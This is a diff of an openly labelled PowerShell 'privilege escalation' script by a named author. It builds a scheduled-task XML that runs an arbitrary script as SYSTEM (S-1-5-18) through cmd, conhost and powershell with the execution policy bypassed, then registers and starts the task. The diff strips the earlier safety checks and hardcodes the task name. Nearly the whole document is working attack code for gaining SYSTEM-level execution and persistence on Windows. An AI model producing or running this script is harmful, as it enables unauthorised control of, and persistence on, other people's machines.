@@ -1,50 +1,6 @@
 # Author: phoogeveen aka x0xr00t
 # Description: This script creates a scheduled task for privilege escalation by running a PowerShell script with the highest privileges.
 # Version: 1.0
-
-# Define parameters for task configuration
-param (
-    [string]$ScriptPath = "C:\Path\To\Your\Script\your-ps-code.ps1", # Path to the PowerShell script
-    [string]$TaskName = "sl0ppy-PrivescTask" # Name of the scheduled task
-)
-
-# Function to check if a script exists
-function Test-ScriptExistence {
-    param (
-        [string]$path
-    )
-    if (Test-Path $path) {
-        return $true
-    } else {
-        Write-Error "The script at '$path' does not exist."
-        return $false
-    }
-}
-
-# Function to check if the current user has elevated (admin) rights
-function Test-Elevation {
-    try {
-        $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
-        $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
-        return $currentUser.IsInRole($adminRole)
-    } catch {
-        Write-Error "Failed to check for elevation. Error: $_"
-        return $false
-    }
-}
-
-# Check if the script exists before proceeding
-if (-not (Test-ScriptExistence -path $ScriptPath)) {
-    Write-Error "The specified script '$ScriptPath' does not exist. Exiting."
-    exit
-}
-
-# Check if the user has elevated privileges
-if (-not (Test-Elevation)) {
-    Write-Error "You do not have elevated privileges. This task requires administrator rights."
-    exit
-}
-
 # Get the current system time
 $currentDateTime = Get-Date
 Write-Output "Current system time: $currentDateTime"
@@ -53,7 +9,7 @@ Write-Output "Current system time: $currentDateTime"
 $startTime = $currentDateTime.AddMinutes(2)
 Write-Output "Scheduled task will start at: $startTime"
 
-# Format the start time as required by the XML
+# Format the start time for use in XML (in UTC format)
 $formattedStartTime = $startTime.ToString("yyyy-MM-ddTHH:mm:ss")
 Write-Output "Formatted start time for XML: $formattedStartTime"
 
@@ -64,7 +20,7 @@ $taskXml = @"
   <RegistrationInfo>
     <Date>$formattedStartTime</Date>
     <Author>NT AUTHORITY\SYSTEM</Author>
-    <URI>\$TaskName</URI>
+    <URI>\ElevatedTask</URI>
   </RegistrationInfo>
   <Triggers>
     <TimeTrigger>
@@ -74,8 +30,8 @@ $taskXml = @"
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <UserId>S-1-5-18</UserId> <!-- SYSTEM user -->
-      <RunLevel>HighestAvailable</RunLevel> <!-- Highest available privilege -->
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
   <Settings>
@@ -99,46 +55,45 @@ $taskXml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-NoProfile -ExecutionPolicy Bypass -File "$ScriptPath"</Arguments>
-      <WorkingDirectory>$([System.IO.Path]::GetDirectoryName($ScriptPath))</WorkingDirectory>
+      <Command>cmd.exe</Command>
+      <Arguments>/c start /b "" conhost.exe cmd.exe /K powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Path\To\Your\Script.ps1"</Arguments>
+      <WorkingDirectory>C:\Path\To\Your\Directory\</WorkingDirectory>
     </Exec>
   </Actions>
 </Task>
 "@
 
-# Register the scheduled task
-try {
-    Register-ScheduledTask -Xml $taskXml -TaskName $TaskName -Force
-    Write-Output "Scheduled task '$TaskName' registered successfully."
-} catch {
-    Write-Error "Failed to register the scheduled task. Error: $_"
+# Ensure that the scheduled task XML is valid
+if (-not $taskXml) {
+    Write-Error "Failed to create XML for scheduled task."
     exit
 }
 
-# Start the scheduled task
+# Register the scheduled task with the XML definition
 try {
-    Start-ScheduledTask -TaskName $TaskName
-    Write-Output "Scheduled task '$TaskName' started successfully."
+    Register-ScheduledTask -Xml $taskXml -TaskName "ElevatedTask" -Force
+    Write-Output "Scheduled task 'ElevatedTask' registered successfully."
 } catch {
-    Write-Error "Failed to start the scheduled task. Error: $_"
+    Write-Error "Failed to register scheduled task: $_"
     exit
 }
 
-# Wait for the task to start
-Start-Sleep -Seconds 5  # Adjust sleep time as needed
+# Start the scheduled task immediately
+try {
+    Start-ScheduledTask -TaskName "ElevatedTask"
+    Write-Output "Scheduled task 'ElevatedTask' started successfully."
+} catch {
+    Write-Error "Failed to start scheduled task: $_"
+    exit
+}
 
-# Get the process ID of the started process
-$processId = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`*"} | Select-Object -ExpandProperty ProcessId
-Write-Output "Process ID of the started process: $processId"
+# Wait for the task to start (adjust time as needed)
+Start-Sleep -Seconds 5  
 
-# Test the script with different paths (Example: change $ScriptPath for testing)
-$testPaths = @("C:\Path\To\ValidScript.ps1", "C:\InvalidPath\InvalidScript.ps1")
-foreach ($testPath in $testPaths) {
-    Write-Output "Testing script path: $testPath"
-    if (Test-ScriptExistence -path $testPath) {
-        Write-Output "Script '$testPath' exists. Proceeding with task creation."
-    } else {
-        Write-Error "Script '$testPath' does not exist."
-    }
+# Get the process ID of the started task to verify it's running
+try {
+    $processId = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like '*powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Path\To\Your\Script.ps1"'} | Select-Object -ExpandProperty ProcessId
+    Write-Output "Process ID of the started process: $processId"
+} catch {
+    Write-Error "Failed to retrieve process ID: $_"
 }
